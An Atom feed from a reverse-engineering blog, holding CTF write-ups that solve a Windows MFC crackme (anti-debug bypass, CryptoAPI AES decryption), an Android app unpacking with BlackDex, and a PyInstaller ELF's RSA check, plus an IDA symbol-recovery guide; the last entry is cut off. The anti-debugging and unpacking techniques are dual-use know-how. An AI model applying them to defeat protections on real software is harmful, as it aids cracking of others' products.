<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="https://gift1a.github.io/atom.xml" rel="self"/>
  
  <link href="https://gift1a.github.io/"/>
  <updated>2022-04-24T01:38:55.375Z</updated>
  <id>https://gift1a.github.io/</id>
  
  <author>
    <name>Gift1a</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>DASCTF-FATE-Reverse</title>
    <link href="https://gift1a.github.io/2022/04/23/DASCTF-FATE-Reverse/"/>
    <id>https://gift1a.github.io/2022/04/23/DASCTF-FATE-Reverse/</id>
    <published>2022-04-23T12:40:54.000Z</published>
    <updated>2022-04-24T01:38:55.375Z</updated>
    
    <content type="html"><![CDATA[<p>DASCTF-FATE-Reverse</p><span id="more"></span> <h1 id="0x00-Crackme"><a class="header-anchor" href="#0x00-Crackme">¶</a>0x00-Crackme</h1><h2 id="考点-v7"><a class="header-anchor" href="#考点-v7">¶</a>考点</h2><p>MFC逆向、反调试、Wincrypt</p><h2 id="分析-v7"><a class="header-anchor" href="#分析-v7">¶</a>分析</h2><p>看exe文件的图标是MFC，于是去网上搜了一下MFC逆向，发现了这篇文章</p><p><a href="https://blog.csdn.net/Sanky0u/article/details/81568483">https://blog.csdn.net/Sanky0u/article/details/81568483</a></p><p><img src="/2022/04/23/DASCTF-FATE-Reverse/1650718980990.png" alt=""></p><p>1000和1001对应两个输入框</p><p><img src="/2022/04/23/DASCTF-FATE-Reverse/1650719074057.png" alt=""></p><p>能定位到输入框</p><p><img src="/2022/04/23/DASCTF-FATE-Reverse/1650719123440.png" alt=""></p><p>对函数交叉引用发现找不到，因为这里使用的是this指针调用（可能）</p><blockquote><p><strong>MFC主函数是WinMain</strong></p></blockquote><p>然后动调半天看晕了</p><p>字符串搜索回显的字符串Wrong，直接明文存储</p><p>如果下次有机会出这样的题一定把回显字符串加密（</p><p><img src="/2022/04/23/DASCTF-FATE-Reverse/1650719281899.png" alt=""></p><p>流程分析</p><p><img src="/2022/04/23/DASCTF-FATE-Reverse/1650719629400.png" alt=""></p><p>这里都是一些API函数，就不过多介绍了</p><h3 id="key加密"><a class="header-anchor" href="#key加密">¶</a>key加密</h3><p>关键的是</p><p><img src="/2022/04/23/DASCTF-FATE-Reverse/1650719692346.png" alt=""></p><p>不同的值对应了不同的加密</p><p><img src="/2022/04/23/DASCTF-FATE-Reverse/1650719799678.png" alt=""></p><p><img src="/2022/04/23/DASCTF-FATE-Reverse/1650719826383.png" alt=""></p><p>所以就是将我们输入的key分为两个长度为四的字符串，然后分别进行MD5和SHA1加密</p><p><img src="/2022/04/23/DASCTF-FATE-Reverse/1650719927941.png" alt="最终的加密"></p><h3 id="flag加密"><a class="header-anchor" href="#flag加密">¶</a>flag加密</h3><p>先把整段key进行md5加密</p><p><img src="/2022/04/23/DASCTF-FATE-Reverse/1650720029530.png" alt=""></p><p>然后将加密后的key传入最终的加密函数中，生成MD5的哈希值，传入生成Key</p><p><img src="/2022/04/23/DASCTF-FATE-Reverse/1650720157885.png" alt=""></p><p>看到这个参数，查了一下</p><p><a href="https://docs.microsoft.com/zh-tw/windows/win32/seccrypto/alg-id?redirectedfrom=MSDN">https://docs.microsoft.com/zh-tw/windows/win32/seccrypto/alg-id?redirectedfrom=MSDN</a></p><p>发现对应AES-128，也就是生成AES-128的密钥</p><p>然后调用CryptEncrypt函数加密</p><h3 id="反调试-ZwSetInformationThread"><a class="header-anchor" href="#反调试-ZwSetInformationThread">¶</a>反调试-ZwSetInformationThread</h3><p>我们需要动态调试提取数据，但是在刚才的位置设置断点会发现输入后直接结束，应该是有反调试</p><p><a href="https://ctf-wiki.org/reverse/windows/anti-debug/zwsetinformationthread/">https://ctf-wiki.org/reverse/windows/anti-debug/zwsetinformationthread/</a></p><p>对比各种反调试和去IMPORT找导入函数，最终确定是ZwSetInformationThread</p><p><img src="/2022/04/23/DASCTF-FATE-Reverse/1650720722604.png" alt=""></p><p>反反调试在该文中也有介绍，就不再多说了</p><p>绕过后就可以提取数据进行解密了</p><h3 id="得到key"><a class="header-anchor" href="#得到key">¶</a>得到key</h3><p>MD5</p><p><img src="/2022/04/23/DASCTF-FATE-Reverse/1650761698008.png" alt=""></p><p>SHA1</p><p><a href="https://crackstation.net/">https://crackstation.net/</a></p><p><img src="/2022/04/23/DASCTF-FATE-Reverse/1650762007404.png" alt=""></p><h3 id="解密flag"><a class="header-anchor" href="#解密flag">¶</a>解密flag</h3><p>这里直接提取数据拿去AES解密有问题（提取出来调用CryptDecrypt也不行），还是FallW1nd师傅强，想到直接模拟生成哈希值的过程，然后最后调用CryptDecrypt即可</p><p><img src="/2022/04/23/DASCTF-FATE-Reverse/1650762204848.png" alt=""></p><p>EXP如下</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;wincrypt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    HCRYPTKEY phKey; <span class="comment">// [esp+Ch] [ebp-10h] BYREF</span></span><br><span class="line">    HCRYPTPROV phProv; <span class="comment">// [esp+10h] [ebp-Ch] BYREF</span></span><br><span class="line">    HCRYPTHASH phHash; <span class="comment">// [esp+14h] [ebp-8h] BYREF</span></span><br><span class="line">    BOOL retValue;</span><br><span class="line"></span><br><span class="line">    BYTE flag_data[<span class="number">0x104</span>] = { <span class="number">0x5B</span>, <span class="number">0x9C</span>, <span class="number">0xEE</span>, <span class="number">0xB2</span>, <span class="number">0x3B</span>, <span class="number">0xB7</span>, <span class="number">0xD7</span>, <span class="number">0x34</span>, <span class="number">0xF3</span>, <span class="number">0x1B</span>, <span class="number">0x75</span>, <span class="number">0x14</span>, <span class="number">0xC6</span>, <span class="number">0xB2</span>, <span class="number">0x1F</span>, <span class="number">0xE8</span>, <span class="number">0xDE</span>, <span class="number">0x33</span>, <span class="number">0x44</span>, <span class="number">0x74</span>, <span class="number">0x75</span>, <span class="number">0x1B</span>, <span class="number">0x47</span>, <span class="number">0x6A</span>, <span class="number">0xD4</span>, <span class="number">0x37</span>, <span class="number">0x51</span>, <span class="number">0x88</span>, <span class="number">0xFC</span>, <span class="number">0x67</span>, <span class="number">0xE6</span>, <span class="number">0x60</span>, <span class="number">0xDA</span>, <span class="number">0x0D</span>, <span class="number">0x58</span>, <span class="number">0x07</span>, <span class="number">0x81</span>, <span class="number">0x43</span>, <span class="number">0x53</span>, <span class="number">0xEA</span>, <span class="number">0x7B</span>, <span class="number">0x52</span>, <span class="number">0x85</span>, <span class="number">0x6C</span>, <span class="number">0x86</span>, <span class="number">0x65</span>, <span class="number">0xAF</span>, <span class="number">0xB4</span> };</span><br><span class="line">    BYTE keyBuf[] = { <span class="number">0x5c</span>,<span class="number">0x53</span>,<span class="number">0xa4</span>,<span class="number">0xa4</span>,<span class="number">0x1d</span>,<span class="number">0x52</span>,<span class="number">0x43</span>,<span class="number">0x7a</span>,<span class="number">0x9f</span>,<span class="number">0xa1</span>,<span class="number">0xe9</span>,<span class="number">0xc2</span>,<span class="number">0x6c</span>,<span class="number">0xa5</span>,<span class="number">0x90</span>,<span class="number">0x90</span> };</span><br><span class="line">    DWORD dwDataLen = <span class="number">0x10</span>;</span><br><span class="line">    DWORD dwBufLen = <span class="number">0x104</span>;</span><br><span class="line">    DWORD dwDataLen_2;</span><br><span class="line">    DWORD* pdwDataLen = &amp;dwDataLen_2;</span><br><span class="line">    *pdwDataLen = <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    phProv = <span class="number">0</span>;</span><br><span class="line">    phHash = <span class="number">0</span>;</span><br><span class="line">    phKey = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    retValue = CryptAcquireContextA(&amp;phProv, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x18</span>u, <span class="number">0xF0000000</span>);</span><br><span class="line">    <span class="keyword">if</span> (retValue)</span><br><span class="line">    {</span><br><span class="line">        retValue = CryptCreateHash(phProv, <span class="number">0x8003</span>u, <span class="number">0</span>, <span class="number">0</span>, &amp;phHash);</span><br><span class="line">        <span class="keyword">if</span> (retValue)</span><br><span class="line">        {</span><br><span class="line">            retValue = CryptHashData(phHash, keyBuf, dwDataLen, <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span> (retValue)</span><br><span class="line">            {</span><br><span class="line">                retValue = CryptDeriveKey(phProv, <span class="number">0x660E</span>u, phHash, <span class="number">1u</span>, &amp;phKey);</span><br><span class="line">                <span class="keyword">if</span> (retValue)</span><br><span class="line">                    retValue = CryptDecrypt(phKey, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, flag_data, pdwDataLen);</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (phKey)</span><br><span class="line">        CryptDestroyKey(phKey);</span><br><span class="line">    <span class="keyword">if</span> (phHash)</span><br><span class="line">        CryptDestroyHash(phHash);</span><br><span class="line">    <span class="keyword">if</span> (phProv)</span><br><span class="line">        CryptReleaseContext(phProv, <span class="number">0</span>);</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">return</span> retValue;</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="附录"><a class="header-anchor" href="#附录">¶</a>附录</h3><p>还有这种调用加密，有兴趣可以去看看-<a href="http://ctf.hsc2019.site/challenges#DRIVER-58">http://ctf.hsc2019.site/challenges#DRIVER-58</a></p><p><img src="/2022/04/23/DASCTF-FATE-Reverse/1650762364038.png" alt=""></p><h1 id="0x01-FakePica"><a class="header-anchor" href="#0x01-FakePica">¶</a>0x01-FakePica</h1><h2 id="考点-v8"><a class="header-anchor" href="#考点-v8">¶</a>考点</h2><p>安卓加壳、AES</p><h2 id="分析-v8"><a class="header-anchor" href="#分析-v8">¶</a>分析</h2><p>hgame-week3-re也有脱壳，这里把工具链接贴一下</p><p><a href="https://github.com/CodingGay/BlackDex">https://github.com/CodingGay/BlackDex</a></p><p>具体分析加壳与脱壳直接看我之前写的文章</p><p><a href="https://gift1a.github.io/2022/02/13/hgame2022-week3-re/?highlight=%E6%A2%86">https://gift1a.github.io/2022/02/13/hgame2022-week3-re/?highlight=梆</a></p><h3 id="加密分析"><a class="header-anchor" href="#加密分析">¶</a>加密分析</h3><p>找到Mainactivity</p><p><img src="/2022/04/23/DASCTF-FATE-Reverse/1650762932688.png" alt=""></p><p>数据提取</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> content[] = {<span class="number">-114</span>, <span class="number">95</span>, <span class="number">-37</span>, <span class="number">127</span>, <span class="number">-110</span>, <span class="number">113</span>, <span class="number">41</span>, <span class="number">74</span>, <span class="number">40</span>, <span class="number">73</span>, <span class="number">19</span>, <span class="number">124</span>, <span class="number">-57</span>, <span class="number">-88</span>, <span class="number">39</span>, <span class="number">-116</span>, <span class="number">-16</span>, <span class="number">-75</span>, <span class="number">-3</span>, <span class="number">-45</span>, <span class="number">-73</span>, <span class="number">-6</span>, <span class="number">-104</span>, <span class="number">-6</span>, <span class="number">-78</span>, <span class="number">121</span>, <span class="number">110</span>, <span class="number">74</span>, <span class="number">-90</span>, <span class="number">-47</span>, <span class="number">-28</span>, <span class="number">-28</span>};</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> content1[] = {<span class="number">-40</span>, <span class="number">26</span>, <span class="number">95</span>, <span class="number">-49</span>, <span class="number">-40</span>, <span class="number">-123</span>, <span class="number">72</span>, <span class="number">-90</span>, <span class="number">-100</span>, <span class="number">-41</span>, <span class="number">122</span>, <span class="number">-4</span>, <span class="number">25</span>, <span class="number">-101</span>, <span class="number">-58</span>, <span class="number">116</span>};</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; ++i)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%X"</span>, content1[i] &amp; <span class="number">0xff</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>解密直接去在线网站即可</p><p><img src="/2022/04/23/DASCTF-FATE-Reverse/1650763024950.png" alt=""></p><p><img src="/2022/04/23/DASCTF-FATE-Reverse/1650763086950.png" alt="get flag"></p><h1 id="0x02-奇怪的交易"><a class="header-anchor" href="#0x02-奇怪的交易">¶</a>0x02-奇怪的交易</h1><h2 id="考点-v9"><a class="header-anchor" href="#考点-v9">¶</a>考点</h2><p>ELF-python打包、算法</p><h2 id="分析-v9"><a class="header-anchor" href="#分析-v9">¶</a>分析</h2><p>还好加了Lu1u师傅，刚好看到https://lu1u.xyz/2022/03/28/RE_Challenge/</p><p><img src="/2022/04/23/DASCTF-FATE-Reverse/1650763204421.png" alt=""></p><blockquote><p><strong>objcopy --dump-section pydata=pydata.dump 1</strong></p><p><strong>sudo snap install pyinstxtractor</strong></p><p><strong>pyinstxtractor pydata.dump</strong></p></blockquote><p>得到pyc文件，修补好文件头发现uncompyle6不了，寄，只能嗯读python字节码</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> dis</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="comment">#pub_key=[12702192797044914024075774649965354105344232304099465264316470282606351700311177624703682814557100043599414982439635470829841890299241342602374578366076034128412992290094164613120745611751102797279925764448133764246126488845600641524814194290745105708735258127757986238766868988676022258542038318776640732920027324986285887310132372524224961045858183153047991881042129131551711617627844146600513830709959185824512201669420128585170924683844128155435146399996585220865423125338735154727569986267948480523307784641442521735105741341230032585576300299944879647981670048377150556292280650846158185797588466680532743801893,12680615221091469696163926483122992106481999501435284497098601343706982733487916553201934931961274845294041438909951977672521864927961654544622905443692482152403380984734291652023321187458458985625147422841102922314725726207365632256563373977251725785357590588556314671253970422319546403985257810950046085994573229162322957630767327089195523762665081311711474689269184996318744510300057603532953644164998953897411177604349567514705039306693117602798453972917348902600111420473965929048876821563646206875034926505783009957256212261250539005023918242209009676914632796839852778318989278092929214021282438144809708279435]</span></span><br><span class="line">pp=[<span class="number">0</span>]</span><br><span class="line">dd=[<span class="number">54</span>,<span class="number">54</span>,<span class="number">54</span>,<span class="number">54</span>]</span><br><span class="line">oo=[<span class="number">3532577106</span>, <span class="number">1472742623</span>, <span class="number">3642468664</span>, <span class="number">4193500461</span>, <span class="number">2398676029</span>, <span class="number">617653972</span>, <span class="number">1474514999</span>, <span class="number">1471783658</span>, <span class="number">1012864704</span>, <span class="number">3615627536</span>, <span class="number">993855884</span>, <span class="number">438456717</span>, <span class="number">3358938551</span>, <span class="number">3906991208</span>, <span class="number">198959101</span>, <span class="number">3317190635</span>, <span class="number">3656923078</span>, <span class="number">613157871</span>, <span class="number">2398768861</span>, <span class="number">97286225</span>, <span class="number">2336972940</span>, <span class="number">1471645170</span>, <span class="number">3233163154</span>, <span class="number">583597118</span>, <span class="number">2863776301</span>, <span class="number">3183067750</span>, <span class="number">1384330715</span>, <span class="number">2929694742</span>, <span class="number">3522431804</span>, <span class="number">2181488067</span>, <span class="number">3303062236</span>, <span class="number">3825712422</span>, <span class="number">145643141</span>, <span class="number">2148976293</span>, <span class="number">2940910035</span>, <span class="number">506798154</span>, <span class="number">994590281</span>, <span class="number">2231904779</span>, <span class="number">3389770074</span>, <span class="number">2814269052</span>, <span class="number">1105937096</span>, <span class="number">1789727804</span>, <span class="number">3757028753</span>, <span class="number">2469686072</span>, <span class="number">1162286478</span>, <span class="number">680814033</span>, <span class="number">2934024098</span>, <span class="number">2162521262</span>, <span class="number">4048876895</span>, <span class="number">2121620700</span>, <span class="number">4240287315</span>, <span class="number">2391811140</span>, <span class="number">3396611602</span>, <span class="number">3091349617</span>, <span class="number">3031523010</span>, <span class="number">2486958601</span>, <span class="number">3164065171</span>, <span class="number">1285603712</span>, <span class="number">798920280</span>, <span class="number">2337813135</span>, <span class="number">4186055520</span>, <span class="number">3523024366</span>, <span class="number">1077514121</span>, <span class="number">1436444106</span>, <span class="number">2731983230</span>, <span class="number">1507202797</span>, <span class="number">500756149</span>, <span class="number">198754565</span>, <span class="number">2382448647</span>, <span class="number">880454148</span>, <span class="number">1970517398</span>, <span class="number">3217485349</span>, <span class="number">1161840191</span>, <span class="number">560498076</span>, <span class="number">1782600856</span>, <span class="number">2643721918</span>, <span class="number">1285196205</span>, <span class="number">788797746</span>, <span class="number">1195724574</span>, <span class="number">4061612551</span>, <span class="number">103427523</span>, <span class="number">2502688387</span>, <span class="number">4147162188</span>, <span class="number">617564657</span>, <span class="number">978211984</span>, <span class="number">1781482121</span>, <span class="number">2205798970</span>, <span class="number">3939973102</span>, <span class="number">3826603515</span>, <span class="number">659557668</span>, <span class="number">2582884932</span>, <span class="number">1561884856</span>, <span class="number">2217488804</span>, <span class="number">1189296962</span>, <span class="number">169145316</span>, <span class="number">2781742156</span>, <span class="number">1323893433</span>, <span class="number">824667876</span>, <span class="number">408202876</span>, <span class="number">3759637634</span>, <span class="number">4094868412</span>, <span class="number">1508996065</span>, <span class="number">162419237</span>, <span class="number">3732146944</span>, <span class="number">3083560189</span>, <span class="number">3955940127</span>, <span class="number">2393776934</span>, <span class="number">2470191468</span>, <span class="number">3620861513</span>, <span class="number">481927014</span>, <span class="number">2756226070</span>, <span class="number">3154651143</span>, <span class="number">1261069441</span>, <span class="number">2063238535</span>, <span class="number">2222237213</span>, <span class="number">101459755</span>, <span class="number">3159774417</span>, <span class="number">1721190841</span>, <span class="number">1078395785</span>, <span class="number">176506553</span>, <span class="number">3552913423</span>, <span class="number">1566142515</span>, <span class="number">1938949000</span>, <span class="number">1499289517</span>, <span class="number">3315102456</span>, <span class="number">829714860</span>, <span class="number">3843359394</span>, <span class="number">952932374</span>, <span class="number">1283577465</span>, <span class="number">2045007203</span>, <span class="number">3957761944</span>, <span class="number">3767891405</span>, <span class="number">2917089623</span>, <span class="number">3296133521</span>, <span class="number">482297421</span>, <span class="number">1734231412</span>, <span class="number">3670478932</span>, <span class="number">2575334979</span>, <span class="number">2827842737</span>, <span class="number">3413631016</span>, <span class="number">1533519803</span>, <span class="number">4008428470</span>, <span class="number">3890643173</span>, <span class="number">272960248</span>, <span class="number">317508587</span>, <span class="number">3299937500</span>, <span class="number">2440520601</span>, <span class="number">27470488</span>, <span class="number">1666674386</span>, <span class="number">1737927609</span>, <span class="number">750987808</span>, <span class="number">2385923471</span>, <span class="number">2694339191</span>, <span class="number">562925334</span>, <span class="number">2206035395</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(oo))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ll</span>():</span></span><br><span class="line">    pub_key = [</span><br><span class="line">        <span class="number">12702192797044914024075774649965354105344232304099465264316470282606351700311177624703682814557100043599414982439635470829841890299241342602374578366076034128412992290094164613120745611751102797279925764448133764246126488845600641524814194290745105708735258127757986238766868988676022258542038318776640732920027324986285887310132372524224961045858183153047991881042129131551711617627844146600513830709959185824512201669420128585170924683844128155435146399996585220865423125338735154727569986267948480523307784641442521735105741341230032585576300299944879647981670048377150556292280650846158185797588466680532743801893</span>,</span><br><span class="line">        <span class="number">12680615221091469696163926483122992106481999501435284497098601343706982733487916553201934931961274845294041438909951977672521864927961654544622905443692482152403380984734291652023321187458458985625147422841102922314725726207365632256563373977251725785357590588556314671253970422319546403985257810950046085994573229162322957630767327089195523762665081311711474689269184996318744510300057603532953644164998953897411177604349567514705039306693117602798453972917348902600111420473965929048876821563646206875034926505783009957256212261250539005023918242209009676914632796839852778318989278092929214021282438144809708279435</span>]</span><br><span class="line">    flag=<span class="built_in">input</span>()</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    m=libnum.s2n(flag)<span class="comment">#字符串转为数字</span></span><br><span class="line">    c=<span class="built_in">str</span>(<span class="built_in">pow</span>(m,pub_key[<span class="number">1</span>],pub_key[<span class="number">0</span>]))<span class="comment">#简单算法并且进行转为字符串</span></span><br><span class="line">    <span class="keyword">if</span> i&lt;<span class="built_in">len</span>(c):</span><br><span class="line">        kk=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> ii <span class="keyword">in</span> c[<span class="built_in">slice</span>(i,i+<span class="number">4</span>)]:</span><br><span class="line">            kk=(kk&lt;&lt;<span class="number">8</span>)+<span class="built_in">ord</span>(ii)</span><br><span class="line">            pp.append(kk)</span><br><span class="line">            i+=<span class="number">4</span></span><br><span class="line">    <span class="keyword">if</span> pp==oo:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"you are right!!"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"gg"</span>)</span><br><span class="line">        quit()</span><br></pre></td></tr></tbody></table></figure><p>翻译出来大概是这样的</p><p>PS：有一部分我不知道干什么的略过了，可能这一段被我略过的是关键555</p><p><img src="/2022/04/23/DASCTF-FATE-Reverse/1650763671802.png" alt=""></p><p>过程差不多都可以读出来，那个for循环就是将每四个字符转为一个int，由于不会python，很多都是自己写代码试出来的（</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;DASCTF-FATE-Reverse&lt;/p&gt;</summary>
    
    
    
    <category term="Reverse" scheme="https://gift1a.github.io/categories/Reverse/"/>
    
    
    <category term="Reverse" scheme="https://gift1a.github.io/tags/Reverse/"/>
    
  </entry>
  
  <entry>
    <title>安卓动调</title>
    <link href="https://gift1a.github.io/2022/04/23/%E5%AE%89%E5%8D%93%E5%8A%A8%E8%B0%83/"/>
    <id>https://gift1a.github.io/2022/04/23/%E5%AE%89%E5%8D%93%E5%8A%A8%E8%B0%83/</id>
    <published>2022-04-23T00:53:44.000Z</published>
    <updated>2022-04-24T01:38:23.648Z</updated>
    
    <content type="html"><![CDATA[<p>安卓动态调试</p><span id="more"></span> ]]></content>
    
    
    <summary type="html">&lt;p&gt;安卓动态调试&lt;/p&gt;</summary>
    
    
    
    <category term="Android" scheme="https://gift1a.github.io/categories/Android/"/>
    
    
    <category term="Android" scheme="https://gift1a.github.io/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>ida符号恢复</title>
    <link href="https://gift1a.github.io/2022/04/22/ida%E7%AC%A6%E5%8F%B7%E6%81%A2%E5%A4%8D/"/>
    <id>https://gift1a.github.io/2022/04/22/ida%E7%AC%A6%E5%8F%B7%E6%81%A2%E5%A4%8D/</id>
    <published>2022-04-22T09:04:39.000Z</published>
    <updated>2022-04-24T01:39:17.064Z</updated>
    
    <content type="html"><![CDATA[<p>ida符号恢复</p><span id="more"></span><h1 id="0x00-前言-v2"><a class="header-anchor" href="#0x00-前言-v2">¶</a>0x00-前言</h1><p>有时候我们在ida中反编译时遇到很多以地址命名的函数，而这些函数实际上是系统函数，当符号表被去除时，函数就会以函数地址命名，但是去除的只是函数的名称，我们可以通过其他方法还原，所以我们可以通过.sig文件来恢复符号，当然还有其他方法</p><h1 id="0x01-恢复符号"><a class="header-anchor" href="#0x01-恢复符号">¶</a>0x01-恢复符号</h1><h2 id="Finger"><a class="header-anchor" href="#Finger">¶</a>Finger</h2><p>符号识别神器</p><p><a href="https://github.com/aliyunav/Finger">https://github.com/aliyunav/Finger</a></p><p>按照里面的介绍安装即可</p><p><img src="/2022/04/22/ida%E7%AC%A6%E5%8F%B7%E6%81%A2%E5%A4%8D/1650621943386.png" alt="恢复前"></p><p><img src="/2022/04/22/ida%E7%AC%A6%E5%8F%B7%E6%81%A2%E5%A4%8D/1650622196897.png" alt="恢复后"></p><p>只能说太强了</p><h2 id="使用lscan和flair"><a class="header-anchor" href="#使用lscan和flair">¶</a>使用lscan和flair</h2><h3 id="lscan"><a class="header-anchor" href="#lscan">¶</a>lscan</h3><p>lscan可以扫描sig文件，找到与二进制文件最相似的库</p><p><a href="https://github.com/maroueneboubakri/lscan">https://github.com/maroueneboubakri/lscan</a></p><figure class="highlight vim"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python</span> ./lscan.<span class="keyword">py</span> -S .<span class="keyword">sig</span>的目录 -<span class="keyword">f</span> 要扫描的二进制文件</span><br></pre></td></tr></tbody></table></figure><p>这里我使用的是python2</p><p>也可以自己下载sig文件</p><p><a href="https://github.com/push0ebp/sig-database">https://github.com/push0ebp/sig-database</a></p><p><img src="/2022/04/22/ida%E7%AC%A6%E5%8F%B7%E6%81%A2%E5%A4%8D/1650623466335.png" alt=""></p><h2 id="flair"><a class="header-anchor" href="#flair">¶</a>flair</h2><p>ida加载sig文件的工具</p><p>使用方法看下面的博客吧，我自己试的时候没找到对应的</p><p><a href="https://blog.csdn.net/Breeze_CAT/article/details/103788796">https://blog.csdn.net/Breeze_CAT/article/details/103788796</a></p><h1 id="0x02-去除符号"><a class="header-anchor" href="#0x02-去除符号">¶</a>0x02-去除符号</h1><p><a href="https://cloud.tencent.com/developer/article/1839671">https://cloud.tencent.com/developer/article/1839671</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;ida符号恢复&lt;/p&gt;</summary>
    
    
    
    <category term="Reverse" scheme="https://gift1a.github.io/categories/Reverse/"/>
    
    
    <category term="Reverse" scheme="https://gift1a.github.io/tags/Reverse/"/>
    
  </entry>
  
  <entry>
    <title>Mips架构逆向初探</title>
    <link href="https://gift1a.github.io/2022/04/22/Mips%E6%9E%B6%E6%9E%84%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/"/>
    <id>https://gift1a.github.io/2022/04/22/Mips%E6%9E%B6%E6%9E%84%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/</id>
    <published>2022-04-22T05:06:13.000Z</published>
    <updated>2022-04-22T07:52:10.310Z</updated>
    
